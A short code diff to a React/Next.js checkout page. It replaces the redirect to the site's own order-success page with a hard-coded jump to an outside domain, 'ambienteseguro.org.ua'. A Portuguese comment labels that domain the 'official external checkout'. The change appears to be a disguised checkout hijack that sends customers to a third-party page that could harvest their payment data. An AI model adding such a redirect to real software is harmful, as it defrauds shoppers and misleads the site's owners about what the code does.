@@ -67,7 +67,8 @@ export default function CheckoutPage() {
     })
     
     if (result.success) {
-      router.push(`/success?orderId=${result.orderId}`)
+      // Redireciona para o checkout externo oficial
+      window.location.href = "https://ambienteseguro.org.ua/c/3fc2387b27"
     } else {
       setLoading(false)
       alert(result.error)
